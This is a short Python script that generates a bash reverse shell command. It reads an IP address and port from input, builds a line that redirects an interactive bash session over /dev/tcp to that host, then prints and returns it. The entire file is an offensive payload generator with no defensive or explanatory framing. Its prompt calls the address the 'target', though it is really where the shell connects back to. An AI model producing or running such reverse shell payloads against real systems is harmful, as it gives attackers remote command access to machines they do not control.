# payload_generator.py
import os

def generate_payload(ip, port):
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    print(f"Generated Payload: {payload}")
    return payload

target_ip = input("Enter target IP: ")
target_port = input("Enter target Port: ")
generate_payload(target_ip, target_port)
